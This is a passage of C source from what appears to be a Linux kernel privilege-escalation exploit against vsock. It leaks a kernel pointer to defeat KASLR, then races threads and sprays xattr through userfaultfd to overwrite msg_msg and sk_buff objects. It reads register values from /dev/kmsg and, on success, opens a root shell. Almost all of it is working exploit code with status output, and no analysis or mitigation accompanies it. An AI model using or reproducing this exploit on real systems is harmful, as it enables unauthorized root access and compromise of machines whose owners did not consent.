	    sock_def_write_space = kmem1.mtext[SK_WRITE_SPACE_RD_LOCATION/ sizeof(unsigned long)];
	    printf("\tsock_def_write_space 0x%lx (offset %ld in the leaked kmem)\n",
				sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

	    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
	    printf("\tkaslr offset: 0x%lx\n", kaslr_offset);
	}else{
		printf("[-] No vsock leak\n");
		return -1;
	}

	printf("[ ] press 'g' to continue\n");
	while (getchar() != 'g') {};



	set_fault_as_handled_userfaultd(xattr_faultfd[0], xtid1, x_th1, &xattr_go[0], spray_data1);


	sk_buff = sk_memcg+4096;
	printf("[ ] stage 3: replace good sk_buff with handcrafted sk_buff\n");	
	printf("[ ] looping for overwriting ...\n");
	aurkitu = 0;
	loop = 0;


	parg.fp = fp;
	parg.rbx = rbx_corr;
	parg.rcx = rcx_corr;

	while(aurkitu == 0) {
		if(loop % 2 == 0){
			sk_buff = sk_memcg+4096;
		}else{
			sk_buff = sk_memcg+4096*2;
		}


		warg.write_val = (sk_buff & 0x00000000FFFFFFFF);

		fseek(fp, 0, SEEK_END);
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		carg.lag_nsec = tmo1;
		carg.overwrite_flag = 1;
		warg.lag_nsec = tmo2;
		warg.overwrite_flag = 1;

		ret = pthread_create(&th[0], NULL, th_connect, &carg);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt, &warg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}


		if(carg.result_msgsnd == -1){
			prepare_payload_sk_buff(spray_data2);
			// Start xattr+usefaultfd spraying
			ret = pthread_barrier_wait(&xattr_barrier2);
		    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
				perror("[-] xattr pthread_barrier_wait");
				return EXIT_FAILURE;
			}
			printf("[ ] spraying...\n");		

			ret = pthread_create(&th[2], NULL, th_parse_kmsg, &parg);
			if (ret != 0)
				err_exit("[-] pthread_create #1");

			// Time to parse /dev/kmsg
			usleep( 50 * 1000);
			pthread_cancel(th[2]);
			ret = pthread_join(th[2], NULL);
			if (ret != 0)
				err_exit("[-] pthread_join #2");

			if(strncmp(rcx_corr, "ff", 2) == 0){
				//printf("[+] RCX, corr msg_msg: 0x%s msq=%d\n", rcx_corr, carg.result_msqid);
				corr_msqid = carg.result_msqid;
				aurkitu++;
			}else{
				strcpy(rcx_corr, "0000000000000000");
			}
			aurkitu++;
		}
		loop++;

	}


	printf("[ ] possible sk_buff address 0x%lx\n", sk_buff);

	printf("[+] succesfully overwritten msg_msg\n");

	printf("[ ] waiting for userfault...\n");
	

	ret = pthread_barrier_wait(&spray_done[1]);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] xattr pthread_barrier_wait");
		return EXIT_FAILURE;
	}



    for(i=0; i<SERVER_AMOUNT; i++){
    	for(int j=0; j<3*2; j++){
    		int n = recv(serverfd[i], (char *)sock_buf, ROP_BUF_SIZE, MSG_WAITALL);
			sock_buf[n] = '\0';
			if(sock_buf[10]!='B'){
				printf("%c", sock_buf[10]);
				printf("[+] succesfully freed skbuff!\n");
				if(sock_buf[10]=='\0'){
					printf("[+] succesfully overwritten skbuff!\n");
				}
			}
    	}

    }


	uid = getuid();
    gid = getgid();

    

    if(uid == 0 && gid == 0){
    	printf("[+] privileges escalated to root successfully!\n");
    	printf("[+] uid=%d (root) gid=%d (root)\n", uid, gid);
    	printf("[+] starting root shell\n");
    	execvp("/bin/sh", argv); 
    }else{
    	printf("[-] sk_buff not found, exploit failed. Reboot.\n");
    }

    //set_fault_as_handled_userfaultd(xattr_faultfd[1], xtid[1], x_th[1], &xattr_go[1], spray_data2);

	ret = close(vsock);
	if (ret)
		err_exit("[-] vsock close");

	return 0;
}